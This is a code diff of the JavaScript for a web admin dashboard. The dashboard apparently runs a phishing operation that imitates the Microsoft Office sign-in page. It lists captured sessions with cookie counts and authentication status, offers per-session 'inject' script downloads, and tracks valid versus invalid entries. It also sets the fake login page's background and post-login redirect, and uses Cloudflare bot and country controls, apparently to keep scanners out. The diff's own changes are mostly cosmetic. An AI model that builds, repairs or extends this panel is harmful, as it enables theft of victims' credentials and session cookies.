                                            class="download-btn" download="${injectFilename}">
                                             DOWNLOAD INJECT
                                         </a>`;
                     } else {
-                        injectColumn = `<span style="color: #666;">NO INJECT SCRIPT</span>`;
+                        injectColumn = `<span style="color: #94a3b8;">NO INJECT SCRIPT</span>`;
                     }
 
-                    // Status badge (account not found errors are already filtered out)
                     const statusBadge = session.status === 'valid' 
                         ? `<span class="status-badge status-success">✅ Valid</span>`
                         : `<span class="status-badge status-error">❌ Invalid</span>`;
@@ -1189,10 +1065,10 @@
                             </div>
                             ${session.status === 'valid' ? 
                                 `<div class="session-info">COOKIES: ${session.totalCookies || 0} ENCRYPTED</div>
-                                 <div class="session-info" style="color: #16a34a;">Status: Successful Authentication</div>` :
-                                `<div class="session-info" style="color: #dc2626;">Failure Reason: ${session.reason || 'Unknown Error'}</div>
-                                 ${session.errorMessage ? `<div class="session-info" style="color: #ef4444;">Error Details: ${session.errorMessage}</div>` : ''}
-                                 <div class="session-info" style="color: #f59e0b;">Status: Failed Authentication</div>`
+                                 <div class="session-info" style="color: #22c55e;">Status: Successful Authentication</div>` :
+                                `<div class="session-info" style="color: #ef4444;">Failure Reason: ${session.reason || 'Unknown Error'}</div>
+                                 ${session.errorMessage ? `<div class="session-info" style="color: #fb923c;">Error Details: ${session.errorMessage}</div>` : ''}
+                                 <div class="session-info" style="color: #fb923c;">Status: Failed Authentication</div>`
                             }
                         </td>
                     `;
@@ -1211,10 +1087,8 @@
             }
         }
 
-        // Load analytics data
         async function loadAnalytics() {
             if (!isAuthenticated) {
-                // Set loading state for analytics
                 document.getElementById('total-visits').textContent = '-';
                 document.getElementById('valid-entries').textContent = '-';
                 document.getElementById('invalid-entries').textContent = '-';
@@ -1224,12 +1098,9 @@
 
             try {
                 const token = getStoredToken();
-                console.log('Loading analytics with token...');
-
                 const response = await fetch(`/api/admin/analytics?token=${encodeURIComponent(token)}`);
 
                 if (response.status === 401) {
-                    console.error('Analytics: Unauthorized access');
                     logout();
                     return;
                 }
@@ -1239,23 +1110,17 @@
                 }
 
                 const analytics = await response.json();
-                console.log('Analytics data received:', analytics);
 
-                // Update dashboard cards with animation
                 updateAnalyticsCard('total-visits', analytics.totalVisits || 0);
                 updateAnalyticsCard('valid-entries', analytics.validEntries || 0);
                 updateAnalyticsCard('invalid-entries', analytics.invalidEntries || 0);
 
-                // Calculate success rate
                 const total = (analytics.validEntries || 0) + (analytics.invalidEntries || 0);
                 const successRate = total > 0 ? Math.round((analytics.validEntries / total) * 100) : 0;
                 updateAnalyticsCard('success-rate', successRate + '%');
 
-                console.log('Analytics updated successfully');
-
             } catch (error) {
                 console.error('Error loading analytics:', error);
-                // Set error state
                 document.getElementById('total-visits').textContent = 'ERROR';
                 document.getElementById('valid-entries').textContent = 'ERROR';
                 document.getElementById('invalid-entries').textContent = 'ERROR';
@@ -1263,7 +1128,6 @@
             }
         }
 
-        // Helper function to update analytics cards with animation
         function updateAnalyticsCard(elementId, value) {
             const element = document.getElementById(elementId);
             if (element) {
@@ -1275,11 +1139,8 @@
             }
         }
 
-        // Cloudflare Configuration Functions
         async function loadCloudflareConfig() {
-            if (!isAuthenticated) {
-                return;
-            }
+            if (!isAuthenticated) return;
 
             try {
                 const token = getStoredToken();
@@ -1293,11 +1154,9 @@
                 const data = await response.json();
 
                 if (data.success && data.config) {
-                    // Populate form fields with saved configuration
                     document.getElementById('cf-email').value = data.config.email || '';
                     document.getElementById('cf-zone-id').value = data.config.zoneId || '';
 
-                    // Update status based on configuration state
                     if (data.config.configured) {
                         document.getElementById('cf-config-status').innerHTML = 
                             `<span class="status-badge status-success">✅ Configured (${data.config.authMethod === 'token' ? 'API Token' : 'Global API Key'})</span>`;
@@ -1305,8 +1164,6 @@
                         document.getElementById('cf-config-status').innerHTML = 
                             `<span class="status-badge status-error">⚠️ Not Configured</span>`;
                     }
-                } else {
-                    console.error('Failed to load Cloudflare config:', data.error);
                 }
             } catch (error) {
                 console.error('Error loading Cloudflare config:', error);
@@ -1319,10 +1176,10 @@
 
             if (apiKeyInput.type === 'password') {
                 apiKeyInput.type = 'text';
-                toggleBtn.textContent = 'HIDE';
+                toggleBtn.textContent = 'Hide API Key';
             } else {
                 apiKeyInput.type = 'password';
-                toggleBtn.textContent = 'SHOW';
+                toggleBtn.textContent = 'Show API Key';
             }
         }
 
@@ -1363,10 +1220,8 @@
                     document.getElementById('cf-config-status').innerHTML = 
                         '<span class="status-badge status-success">✅ Cloudflare Configured Successfully</span>';
 
-                    // Clear only the API key field for security, but keep email and zone ID visible
                     document.getElementById('cf-api-key').value = '';
 
-                    // Reload configuration to show saved details
                     setTimeout(() => {
                         loadCloudflareConfig();
                         loadCloudflareStatus();
@@ -1383,27 +1238,10 @@
                 alert('❌ CONFIGURATION FAILED: ' + error.message);
             } finally {
                 saveBtn.disabled = false;
-                saveBtn.textContent = 'SAVE';
+                saveBtn.textContent = 'Save Configuration';
             }
         }
 
-        function loadConfigurationStatus() {
-            // Check if Cloudflare is already configured by trying to load status
-            if (isAuthenticated) {
-                loadCloudflareStatus().then(() => {
-                    // If status loads successfully, update config status
-                    const cfStatus = document.getElementById('cf-status').textContent;
-                    if (cfStatus === 'ONLINE') {
-                        document.getElementById('cf-config-status').innerHTML = 
-                            '<span style="color: #00ff66; font-weight: bold;">✅ CLOUDFLARE CONFIGURED & CONNECTED</span>';
-                    }
-                }).catch(() => {
-                    // Keep the default "not configured" message
-                });
-            }
-        }
-
-        // Cloudflare Management Functions
         async function loadCloudflareStatus() {
             if (!isAuthenticated) {
                 document.getElementById('cf-status').textContent = 'AUTH REQUIRED';
@@ -1423,19 +1261,12 @@
 
                 if (data.success) {
                     document.getElementById('cf-status').textContent = 'ONLINE';
-                    document.getElementById('cf-status').style.color = '#00ff66';
-
-                    // Update status displays
                     updateCloudflareStatus(data.settings);
-
-                    // Also load country rules when loading status
                     await loadCountryRules();
                 } else {
                     document.getElementById('cf-status').textContent = 'ERROR';
-                    document.getElementById('cf-status').style.color = '#ff3333';
                     console.error('Cloudflare status error:', data.error || data.message);
 
-                    // Update config status to show the error
                     if (data.error && data.error.includes('not configured')) {
                         document.getElementById('cf-config-status').innerHTML = 
                             '<span class="status-badge status-error">⚠️ Not Configured</span>';
@@ -1444,48 +1275,31 @@
             } catch (error) {
                 console.error('Error loading Cloudflare status:', error);
                 document.getElementById('cf-status').textContent = 'OFFLINE';
-                document.getElementById('cf-status').style.color = '#ff3333';
-
-                // Show more specific error information
                 document.getElementById('cf-config-status').innerHTML = 
                     `<span class="status-badge status-error">❌ Connection Error: ${error.message}</span>`;
             }
         }
 
         function updateCloudflareStatus(settings) {
-            // Update Bot Fight Mode
             const botFightStatus = document.getElementById('bot-fight-status');
             if (botFightStatus) {
                 botFightStatus.textContent = settings.botFightMode ? 'ON' : 'OFF';
-                botFightStatus.style.color = settings.botFightMode ? '#00ff66' : '#ff6666';
             }
 
-            // Update Security Level
             const securityLevelStatus = document.getElementById('security-level-status');
             const securityLevelSelect = document.getElementById('security-level-select');
 
             if (securityLevelStatus) {
                 securityLevelStatus.textContent = settings.securityLevel.toUpperCase();
-                const securityColors = {
-                    'off': '#666',
-                    'essentially_off': '#999',
-                    'low': '#ffff66',
-                    'medium': '#ff9933',
-                    'high': '#ff6666',
-                    'under_attack': '#ff0000'
-                };
-                securityLevelStatus.style.color = securityColors[settings.securityLevel] || '#ff6666';
             }
 
             if (securityLevelSelect) {
                 securityLevelSelect.value = settings.securityLevel;
             }
 
-            // Update Browser Check
             const browserCheckStatus = document.getElementById('browser-check-status');
             if (browserCheckStatus) {
                 browserCheckStatus.textContent = settings.browserCheck ? 'ON' : 'OFF';
-                browserCheckStatus.style.color = settings.browserCheck ? '#00ff66' : '#ff6666';
             }
         }
 
@@ -1510,8 +1324,6 @@
 
                 if (data.success) {
                     document.getElementById('bot-fight-status').textContent = data.enabled ? 'ON' : 'OFF';
-                    document.getElementById('bot-fight-status').style.color = data.enabled ? '#00ff66' : '#ff6666';
-                    console.log(data.message);
                 } else {
                     alert('Error: ' + (data.message || data.error || 'Unknown error'));
                 }
@@ -1520,7 +1332,7 @@
                 alert('Network error occurred');
             } finally {
                 btn.disabled = false;
-                btn.textContent = 'TOGGLE BOT FIGHT';
+                btn.textContent = 'Toggle Bot Fight';
             }
         }
 
@@ -1541,16 +1353,6 @@
 
                 if (data.success) {
                     document.getElementById('security-level-status').textContent = data.level.toUpperCase();
-                    const securityColors = {
-                        'off': '#666',
-                        'essentially_off': '#999',
-                        'low': '#ffff66',
-                        'medium': '#ff9933',
-                        'high': '#ff6666',
-                        'under_attack': '#ff0000'
-                    };
-                    document.getElementById('security-level-status').style.color = securityColors[data.level] || '#ff6666';
-                    console.log(data.message);
                 } else {
                     console.error('Security level error:', data.error);
                     alert('Error: ' + (data.message || data.error || 'Unknown error'));
@@ -1582,8 +1384,6 @@
 
                 if (data.success) {
                     document.getElementById('browser-check-status').textContent = data.enabled ? 'ON' : 'OFF';
-                    document.getElementById('browser-check-status').style.color = data.enabled ? '#00ff66' : '#ff6666';
-                    console.log(data.message);
                 } else {
                     alert('Error: ' + data.error);
                 }
@@ -1592,11 +1392,10 @@
                 alert('Network error occurred');
             } finally {
                 btn.disabled = false;
-                btn.textContent = 'TOGGLE BROWSER CHECK';
+                btn.textContent = 'Toggle Browser Check';
             }
         }
 
-        // Country Access Control Functions
         async function loadCountryRules() {
             if (!isAuthenticated) return;
 
@@ -1609,18 +1408,15 @@
                     displayCountryRules(data.rules);
                     document.getElementById('country-rules-count').textContent = data.count;
 
-                    // Update access status based on rules
                     if (data.count === 0) {
                         document.getElementById('country-access-status').textContent = 'OPEN';
-                        document.getElementById('country-access-status').style.color = '#0099ff';
                     } else {
                         document.getElementById('country-access-status').textContent = 'RESTRICTED';
-                        document.getElementById('country-access-status').style.color = '#ff6666';
                     }
                 } else {
                     console.error('Failed to load country rules:', data.error);
                     document.getElementById('country-rules-container').innerHTML = `
-                        <div style="color: #ff6666; font-size: 10px; text-align: center; padding: 15px;">
+                        <div style="color: #ef4444; font-size: 14px; text-align: center; padding: 15px;">
                             Failed to load country rules: ${data.error}
                         </div>
                     `;
@@ -1628,7 +1424,7 @@
             } catch (error) {
                 console.error('Error loading country rules:', error);
                 document.getElementById('country-rules-container').innerHTML = `
-                    <div style="color: #ff6666; font-size: 10px; text-align: center; padding: 15px;">
+                    <div style="color: #ef4444; font-size: 14px; text-align: center; padding: 15px;">
                         Network error loading country rules
                     </div>
                 `;
@@ -1640,7 +1436,7 @@
 
             if (!rules || rules.length === 0) {
                 container.innerHTML = `
-                    <div style="color: #666; font-size: 10px; text-align: center; padding: 15px;">
+                    <div style="color: #94a3b8; font-size: 14px; text-align: center; padding: 15px;">
                         No country access rules configured
                     </div>
                 `;
@@ -1650,24 +1446,23 @@
             const rulesHtml = rules.map(rule => {
                 const isBlockRule = rule.expression.includes(' in ');
                 const actionText = isBlockRule ? 'BLOCK' : 'ALLOW ONLY';
-                const actionColor = isBlockRule ? '#ff6666' : '#00ff66';
+                const actionColor = isBlockRule ? '#ef4444' : '#22c55e';
 
-                // Extract countries from expression
                 const matches = rule.expression.match(/\{"([^"]+)"/);
                 const countries = matches ? matches[1].split('" "') : [];
 
                 return `
-                    <div style="background: rgba(0,0,0,0.3); border: 1px solid #444; padding: 8px; border-radius: 3px; margin-bottom: 8px;">
-                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
-                            <div style="color: ${actionColor}; font-size: 10px; font-weight: bold;">${actionText}</div>
-                            <button onclick="deleteCountryRule('${rule.id}')" style="background: #cc3333; color: white; border: none; padding: 2px 6px; font-size: 8px; border-radius: 2px; cursor: pointer;">
+                    <div style="background: #0f172a; border: 1px solid #475569; padding: 12px; border-radius: 6px; margin-bottom: 12px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                            <div style="color: ${actionColor}; font-size: 14px; font-weight: bold;">${actionText}</div>
+                            <button onclick="deleteCountryRule('${rule.id}')" style="background: #ef4444; color: white; border: none; padding: 4px 12px; font-size: 12px; border-radius: 4px; cursor: pointer;">
                                 DELETE
                             </button>
                         </div>
-                        <div style="color: #ff9933; font-size: 9px; margin-bottom: 2px;">
+                        <div style="color: #fb923c; font-size: 13px; margin-bottom: 4px;">
                             Countries: ${countries.join(', ')}
                         </div>
-                        <div style="color: #666; font-size: 8px;">
+                        <div style="color: #94a3b8; font-size: 12px;">
                             ${rule.description || 'No description'}
                         </div>
                     </div>
@@ -1690,7 +1485,6 @@
                 return;
             }
 
-            // Parse and validate country codes
             const countries = countriesInput.split(',').map(c => c.trim().toUpperCase()).filter(c => c.length === 2);
 
             if (countries.length === 0) {
@@ -1716,14 +1510,9 @@
                 const data = await response.json();
 
                 if (data.success) {
-                    // Clear form
                     document.getElementById('country-codes-input').value = '';
                     document.getElementById('country-rule-name').value = '';
-
-                    // Reload rules
                     await loadCountryRules();
-
-                    console.log(data.message);
                     alert(`✅ Country rule created successfully!\n\n${data.message}`);
                 } else {
                     alert('Error creating country rule: ' + (data.message || data.error || 'Unknown error'));
@@ -1733,7 +1522,7 @@
                 alert('Network error occurred while creating rule');
             } finally {
                 btn.disabled = false;
-                btn.textContent = 'CREATE RULE';
+                btn.textContent = 'Create Rule';
             }
         }
 
@@ -1753,9 +1542,7 @@
                 const data = await response.json();
 
                 if (data.success) {
-                    // Reload rules
                     await loadCountryRules();
-                    console.log(data.message);
                 } else {
                     alert('Error deleting country rule: ' + (data.message || data.error || 'Unknown error'));
                 }
@@ -1781,7 +1568,6 @@
 
                 if (data.success) {
                     document.getElementById('security-level-status').textContent = 'UNDER ATTACK';
-                    document.getElementById('security-level-status').style.color = '#ff0000';
                     document.getElementById('security-level-select').value = 'under_attack';
                     alert('🚨 UNDER ATTACK MODE ENABLED');
                 } else {
@@ -1799,28 +1585,24 @@
             const token = getStoredToken();
 
             try {
-                // Disable bot fight mode
                 await fetch(`/api/admin/cloudflare/bot-fight?token=${encodeURIComponent(token)}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ enabled: false })
                 });
 
-                // Set security to off
                 await fetch(`/api/admin/cloudflare/security-level?token=${encodeURIComponent(token)}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ level: 'off' })
                 });
 
-                // Disable browser check
                 await fetch(`/api/admin/cloudflare/browser-check?token=${encodeURIComponent(token)}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ enabled: false })
                 });
 
-                // Refresh status
                 setTimeout(() => loadCloudflareStatus(), 1000);
                 alert('🔓 ALL PROTECTION DISABLED');
             } catch (error) {
@@ -1829,38 +1611,8 @@
             }
         }
 
-        // Load authentication state when page loads
-        document.addEventListener('DOMContentLoaded', function() {
-            checkAuthOnLoad();
-            // Load analytics and redirect config on page load regardless of auth status
-            setTimeout(() => {
-                loadAnalytics();
-                loadRedirectConfig();
-            }, 500);
-        });
-
-        // Update the updateAuthUI function to include configuration status
-        const originalUpdateAuthUI = updateAuthUI;
-        updateAuthUI = function(authenticated) {
-            originalUpdateAuthUI(authenticated);
-            if (authenticated) {
-                setTimeout(() => loadConfigurationStatus(), 1000);
-            }
-        };
-
-        // Enhanced refresh to include Cloudflare status
-        setInterval(() => {
-            if (isAuthenticated) {
-                loadSessions();
-                loadAnalytics();
-                loadCloudflareStatus();
-            }
-        }, 30000);
-
-        // Redirect Configuration Functions
         async function loadRedirectConfig() {
             try {
-                console.log('Loading redirect configuration...');
                 const response = await fetch(`/api/internal/redirect-url`);
 
                 if (!response.ok) {
@@ -1868,17 +1620,14 @@
                 }
 
                 const data = await response.json();
-                console.log('Redirect config response:', data);
 
                 if (data.success && data.redirectUrl) {
                     const currentUrl = data.redirectUrl;
                     document.getElementById('current-redirect-display').textContent = `🎯 ${currentUrl}`;
 
-                    // Update status
                     document.getElementById('redirect-status').innerHTML = 
-                        `<span style="color: #00ff88; font-weight: bold;">📍 REDIRECT STATUS: ACTIVE → ${currentUrl}</span>`;
+                        `<span class="status-badge status-success">📍 REDIRECT STATUS: ACTIVE → ${currentUrl}</span>`;
 
-                    // Set dropdown value
                     const select = document.getElementById('redirect-destination');
                     const option = Array.from(select.options).find(opt => opt.value === currentUrl);
                     if (option) {
@@ -1889,8 +1638,6 @@
                         document.getElementById('custom-redirect-url').value = currentUrl;
                         document.getElementById('custom-redirect-url').style.display = 'block';
                     }
-
-                    console.log('✅ Redirect config loaded successfully:', currentUrl);
                 } else {
                     throw new Error(data.error || 'Failed to load redirect configuration');
                 }
@@ -1898,9 +1645,8 @@
                 console.error('Error loading redirect config:', error);
                 document.getElementById('current-redirect-display').textContent = '❌ Failed to load';
                 document.getElementById('redirect-status').innerHTML = 
-                    `<span style="color: #ff3333; font-weight: bold;">❌ ERROR: ${error.message || 'Network Error'}</span>`;
+                    `<span class="status-badge status-error">❌ ERROR: ${error.message || 'Network Error'}</span>`;
 
-                // Set default values
                 const select = document.getElementById('redirect-destination');
                 if (select) {
                     select.value = 'https://office.com';
@@ -1935,7 +1681,6 @@
                     alert('Please enter a custom URL');
                     return;
                 }
-                // Basic URL validation
                 try {
                     new URL(targetUrl);
                 } catch (e) {
@@ -1944,7 +1689,6 @@
                 }
             }
 
-            // Disable button during update
             const updateBtn = event.target;
             const originalText = updateBtn.textContent;
             updateBtn.disabled = true;
@@ -1968,40 +1712,82 @@
                 if (data.success) {
                     document.getElementById('current-redirect-display').textContent = `🎯 ${targetUrl}`;
                     document.getElementById('redirect-status').innerHTML = 
-                        `<span style="color: #00ff88; font-weight: bold;">✅ PROJECT REDIRECT UPDATED: ${targetUrl}</span>`;
+                        `<span class="status-badge status-success">✅ PROJECT REDIRECT UPDATED: ${targetUrl}</span>`;
                     alert(`✅ Project redirect destination updated to: ${targetUrl}\nThis affects all login redirects in your project.`);
                 } else {
                     alert('Error: ' + (data.error || 'Update failed'));
                     document.getElementById('redirect-status').innerHTML = 
-                        `<span style="color: #ff3333; font-weight: bold;">❌ UPDATE FAILED: ${data.error || 'Unknown error'}</span>`;
+                        `<span class="status-badge status-error">❌ UPDATE FAILED: ${data.error || 'Unknown error'}</span>`;
                 }
             } catch (error) {
                 console.error('Error updating redirect config:', error);
                 alert('Network error occurred: ' + error.message);
                 document.getElementById('redirect-status').innerHTML = 
-                    `<span style="color: #ff3333; font-weight: bold;">❌ NETWORK ERROR</span>`;
+                    `<span class="status-badge status-error">❌ NETWORK ERROR</span>`;
             } finally {
                 updateBtn.disabled = false;
                 updateBtn.textContent = originalText;
             }
         }
 
-        // Dropdown toggle functionality
-        function toggleSection(sectionName) {
-            const content = document.getElementById(sectionName + '-content');
-            const arrow = document.getElementById(sectionName + '-arrow');
+        async function loadBackgroundConfig() {
+            if (!isAuthenticated) return;
 
-            if (content.classList.contains('expanded')) {
-                content.classList.remove('expanded');
-                arrow.textContent = '▶';
-            } else {
-                content.classList.add('expanded');
-                arrow.textContent = '▼';
+            const select = document.getElementById('background-url-select');
+
+            try {
+                const token = getStoredToken();
+                const response = await fetch(`/api/internal/background-url?token=${encodeURIComponent(token)}`);
+                const data = await response.json();
+
+                if (data.success && data.backgroundUrl) {
+                    const savedUrl = data.backgroundUrl;
+
+                    if (select.options[0].value === savedUrl) {
+                        select.value = savedUrl;
+                    } else {
+                        select.value = select.options[0].value;
+                    }
+                } else {
+                    select.value = select.options[0].value;
+                }
+            } catch (error) {
+                console.error('Error loading background config:', error);
+                select.value = select.options[0].value;
             }
         }
 
-        // Handle custom URL dropdown for redirect
+        async function updateBackgroundUrl() {
+            const select = document.getElementById('background-url-select');
+            const url = select.value;
+
+            try {
+                const token = getStoredToken();
+                const response = await fetch(`/api/admin/background-url?token=${encodeURIComponent(token)}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ backgroundUrl: url })
+                });
+
+                const data = await response.json();
+                if (data.success) {
+                    alert('✅ Office login page background updated successfully!');
+                } else {
+                    alert('⚠️ Failed to save background: ' + (data.error || 'Unknown error'));
+                }
+            } catch (error) {
+                console.error('Error saving background URL:', error);
+                alert('❌ Network error while saving background');
+            }
+        }
+
         document.addEventListener('DOMContentLoaded', function() {
+            checkAuthOnLoad();
+            setTimeout(() => {
+                loadAnalytics();
+                loadRedirectConfig();
+            }, 500);
+
             const select = document.getElementById('redirect-destination');
             const customInput = document.getElementById('custom-redirect-url');
 
@@ -2017,149 +1803,13 @@
             }
         });
 
-        
-
-        // Load Cloudflare status when authenticated
-        function updateAuthUI(authenticated) {
-            isAuthenticated = authenticated;
-            const authSection = document.getElementById('auth-section');
-            const authForm = document.getElementById('auth-form');
-            const authSuccess = document.getElementById('auth-success');
-            const loading = document.getElementById('loading');
-            const sessionsContent = document.getElementById('sessions-content');
-            const noSessions = document.getElementById('no-sessions');
-            const backgroundConfigSection = document.getElementById('background-config-section');
-
-            if (authenticated) {
-                authSection.classList.add('authenticated');
-                authForm.style.display = 'none';
-                authSuccess.style.display = 'block';
-                loading.style.display = 'block';
-                sessionsContent.style.display = 'none';
-                noSessions.style.display = 'none';
-                backgroundConfigSection.style.display = 'block'; // Show background section
-                // Load Cloudflare configuration and status, and redirect config
-                setTimeout(() => {
-                    // Ensure authentication state is set before loading config
-                    if (isAuthenticated) {
-                        loadCloudflareConfig();
-                        loadBackgroundConfig(); // Ensure background config is loaded
-                    }
-                    loadCloudflareStatus().then(() => {
-                        // If Cloudflare status loads successfully, update config status
-                        const cfStatus = document.getElementById('cf-status').textContent;
-                        if (cfStatus === 'ONLINE') {
-                            document.getElementById('cf-config-status').innerHTML = 
-                                '<span style="color: #00ff66; font-weight: bold;">✅ CLOUDFLARE CONFIGURED & CONNECTED</span>';
-                            // Hide the configuration form fields when already configured
-                            const configInputs = document.querySelector('#cloudflare-content > div:first-of-type');
-                            if (configInputs) {
-                                configInputs.style.display = 'none';
-                            }
-                        } else {
-                            // Show configuration form if not connected
-                            const configInputs = document.querySelector('#cloudflare-content > div:first-of-type');
-                            if (configInputs) {
-                                configInputs.style.display = 'flex';
-                            }
-                        }
-                    }).catch(() => {
-                        // Keep showing not configured if status fails to load
-                        document.getElementById('cf-config-status').innerHTML = 
-                            '<span style="color: #ff6666; font-weight: bold;">⚠️ NOT CONFIGURED</span>';
-                        // Show configuration form when there's an error
-                        const configInputs = document.querySelector('#cloudflare-content > div:first-of-type');
-                        if (configInputs) {
-                            configInputs.style.display = 'flex';
-                        }
-                    });
-                    loadRedirectConfig();
-                }, 500);
-            } else {
-                authSection.classList.remove('authenticated');
-                authForm.style.display = 'block';
-                authSuccess.style.display = 'none';
-                loading.style.display = 'none';
-                sessionsContent.style.display = 'none';
-                noSessions.style.display = 'none';
-                document.getElementById('error').style.display = 'none';
-                backgroundConfigSection.style.display = 'none'; // Hide background section
-                // Reset Cloudflare status and redirect display
-                document.getElementById('cf-status').textContent = 'AUTH REQUIRED';
-                document.getElementById('cf-status').style.color = '#ff6666';
-                document.getElementById('current-redirect-display').textContent = 'Authentication Required';
-                // Reset configuration status when logged out
-                document.getElementById('cf-config-status').innerHTML = 
-                    '<span style="color: #ff6666; font-weight: 500;">⚠️ NOT CONFIGURED</span>';
-                // Show configuration form when logged out
-                const configInputs = document.querySelector('#cloudflare-content > div:first-of-type');
-                if (configInputs) {
-                    configInputs.style.display = 'flex';
-                }
+        setInterval(() => {
+            if (isAuthenticated) {
+                loadSessions();
+                loadAnalytics();
+                loadCloudflareStatus();
             }
-        }
-
-        // Background Management Functions
-        async function loadBackgroundConfig() {
-            if (!isAuthenticated) return;
-
-            const select = document.getElementById('background-url-select');
-
-            try {
-                const token = getStoredToken();
-                const response = await fetch(`/api/internal/background-url?token=${encodeURIComponent(token)}`);
-                const data = await response.json();
-
-                if (data.success && data.backgroundUrl) {
-                    const savedUrl = data.backgroundUrl;
-                    
-                    // Check if URL matches the default option
-                    if (select.options[0].value === savedUrl) {
-                        select.value = savedUrl;
-                    } else {
-                        // Use default if saved URL doesn't match
-                        select.value = select.options[0].value;
-                    }
-                    
-                    console.log('✅ Office login background config loaded:', savedUrl);
-                } else {
-                    // Set default
-                    select.value = select.options[0].value;
-                }
-            } catch (error) {
-                console.error('Error loading background config:', error);
-                select.value = select.options[0].value;
-            }
-        }
-
-        async function updateBackgroundUrl() {
-            const select = document.getElementById('background-url-select');
-            const url = select.value;
-
-            // Save to backend for Office login page
-            try {
-                const token = getStoredToken();
-                const response = await fetch(`/api/admin/background-url?token=${encodeURIComponent(token)}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ backgroundUrl: url })
-                });
-
-                const data = await response.json();
-                if (data.success) {
-                    alert('✅ Office login page background updated successfully!');
-                    console.log('Background URL saved to backend:', url);
-                } else {
-                    alert('⚠️ Failed to save background: ' + (data.error || 'Unknown error'));
-                }
-            } catch (error) {
-                console.error('Error saving background URL:', error);
-                alert('❌ Network error while saving background');
-            }
-        }
-
-        
-
+        }, 30000);
     </script>
 </body>
 </html>
